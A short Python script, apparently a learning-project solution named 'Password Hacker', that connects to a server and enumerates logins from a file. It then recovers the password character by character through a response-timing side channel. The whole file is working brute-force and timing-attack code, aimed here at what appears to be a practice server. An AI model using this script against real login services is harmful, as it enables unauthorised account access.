import json
import socket
import string
import sys
import time
from typing import TextIO
from _socket import SocketType


def brute_force(logins_file: TextIO, socket_obj: SocketType):
    # Find the first login that exists on the server
    credentials = find_login(logins_file, socket_obj)
    success = False
    # Try to find the password character by character
    # If the password match the beginning of the correct one an exception happens
    while not success:
        # Try all possible letters and digits
        for char in list(string.ascii_letters + string.digits):
            # Add the current character to the end of the password
            temp_pw = str(credentials["password"])
            temp_pw += char
            credentials_json = json.dumps({"login": credentials["login"], "password": temp_pw})
            # Send a login request to the server using the updated password
            start = time.perf_counter()
            socket_obj.send(credentials_json.encode())
            response = socket_obj.recv(1024).decode()
            if response == '{"result": "Connection success!"}':
                credentials["password"] = temp_pw
                return credentials
            end = time.perf_counter()
            time_taken = (end - start) * 10**5
            if time_taken >= 10000:
                credentials["password"] += char


def find_login(logins_file: TextIO, socket_obj: SocketType):
    credentials = {"login": "", "password": ""}
    for login in logins_file:
        credentials["login"] = login.strip()
        credentials_json = json.dumps(credentials)
        socket_obj.send(credentials_json.encode())
        response = socket.recv(1024).decode()
        if response == '{"result": "Wrong password!"}':  # This response means that the provided login is correct
            return credentials
        else:
            continue


ip, port = sys.argv[1], int(sys.argv[2])

with socket.socket() as socket,\
        open(r"C:\Users\Joao Marcos\PycharmProjects\Password Hacker\Password Hacker\task\logins.txt", "r") as logins:
    socket.connect((ip, port))
    print(json.dumps(brute_force(logins, socket)))
